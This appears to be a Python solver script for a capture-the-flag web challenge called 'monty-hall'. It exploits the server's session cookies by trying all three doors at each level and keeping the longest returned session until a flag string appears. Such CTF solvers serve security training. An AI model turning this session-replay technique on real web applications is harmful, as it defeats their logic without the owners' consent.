#!/usr/bin/env python3

import logging
import os
import requests
import re

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "http://monty-hall.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]


def make_request(session, choice):
    r = requests.post(URL, cookies={"session": session}, data={"choice": choice}, allow_redirects=False)
    return r.text, r.cookies['session']


def solve():
    # Get a token for the first level
    _, current_session = make_request("asd", 1)

    # Loop maximum 12 times
    for _ in range(12):
        # Try all three doors
        new_sessions = []
        for i in range(1, 4):
            content, new_session = make_request(current_session, i)

            # If flag found, print it and quit
            if "flag{" in content:
                res = re.findall(r"flag\{[a-zA-Z0-9_]*}", content)[0]
                print(res)
                return

            new_sessions.append(new_session)

        # Choose the longest session
        current_session = max(new_sessions, key=lambda x: len(x))


if __name__ == '__main__':
    solve()
